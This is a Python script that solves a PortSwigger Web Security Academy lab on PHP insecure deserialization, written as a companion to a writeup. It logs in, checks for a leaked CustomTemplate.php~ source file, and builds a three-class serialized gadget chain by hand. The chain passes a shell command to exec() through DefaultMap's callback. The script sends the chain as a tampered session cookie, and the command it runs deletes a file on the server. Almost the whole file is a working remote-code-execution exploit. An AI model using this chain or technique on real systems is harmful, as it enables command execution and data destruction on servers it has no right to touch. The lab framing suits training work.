#!/usr/bin/env python3
"""
Developing a custom gadget chain for PHP deserialization
PortSwigger Web Security Academy -- Insecure Deserialization

Companion script for the writeup: 09-developing-a-custom-gadget-chain-for-php-deserialization.md

What this does:
    Confirms the source leak at /cgi-bin/libs/CustomTemplate.php~, which
    reveals a three-class chain: CustomTemplate.__wakeup() builds a
    Product from two of its own properties; Product.__construct() does a
    *dynamic* property read ($desc->$desc_type); if $desc is a DefaultMap,
    that read triggers DefaultMap.__get($name), which calls
    call_user_func($this->callback, $name). Setting callback to "exec" and
    desc_type to a shell command turns that dynamic property name into the
    argument passed to exec(). We build the resulting three-class object
    graph as raw serialized bytes (private-property null-byte encoding
    throughout) and send it as the session cookie.

Usage:
    python 09-developing-a-custom-gadget-chain-for-php-deserialization.py <lab-url>
    e.g. python 09-developing-a-custom-gadget-chain-for-php-deserialization.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import base64
import re
import sys

import httpx


def _login(client: httpx.Client, base_url: str, username: str, password: str) -> str:
    login_page = client.get(f"{base_url}/login")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', login_page.text)
    csrf = csrf_match.group(1) if csrf_match else None
    login_data = {"username": username, "password": password}
    if csrf:
        login_data["csrf"] = csrf
    client.post(f"{base_url}/login", data=login_data)
    return client.cookies.get("session")


def build_php_custom_gadget_chain(cmd: str) -> bytes:
    """CustomTemplate.__wakeup() -> Product.__construct() -> DefaultMap.__get() -> exec(cmd)."""
    cmd_bytes = cmd.encode("utf-8")
    ct_desc_type = b"\x00CustomTemplate\x00default_desc_type"  # 33 bytes
    ct_desc = b"\x00CustomTemplate\x00desc"                    # 20 bytes
    dm_callback = b"\x00DefaultMap\x00callback"                # 20 bytes

    dm_obj = (
        b'O:10:"DefaultMap":1:{'
        b"s:" + str(len(dm_callback)).encode() + b':"' + dm_callback + b'";'
        b's:4:"exec";'
        b"}"
    )
    payload = (
        b'O:14:"CustomTemplate":2:{'
        b"s:" + str(len(ct_desc_type)).encode() + b':"' + ct_desc_type + b'";'
        b"s:" + str(len(cmd_bytes)).encode() + b':"' + cmd_bytes + b'";'
        b"s:" + str(len(ct_desc)).encode() + b':"' + ct_desc + b'";'
        + dm_obj +
        b"}"
    )
    return payload


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url, "wiener", "peter")
    if not session:
        print("[-] Login failed")
        return

    print("[*] Checking for the CustomTemplate.php~ source leak...")
    r = client.get(f"{lab_url}/cgi-bin/libs/CustomTemplate.php~")
    if "DefaultMap" in r.text:
        print("[+] Found CustomTemplate.php~ with the DefaultMap gadget class")
    else:
        print("[?] Source not found at the expected path -- trying the exploit anyway")

    cmd = "rm /home/carlos/morale.txt"
    payload = build_php_custom_gadget_chain(cmd)
    print(f"[*] Custom gadget chain payload ({len(payload)} bytes): {payload!r}")

    tampered_cookie = base64.b64encode(payload).decode()
    r = httpx.get(
        f"{lab_url}/",
        headers={"Cookie": f"session={tampered_cookie}"},
        follow_redirects=True,
        timeout=15,
    )
    print(f"[*] Injection response: HTTP {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- morale.txt deleted via the custom CustomTemplate/Product/DefaultMap chain.")
    else:
        print("[-] Not solved yet -- verify the source leak revealed the same three classes.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
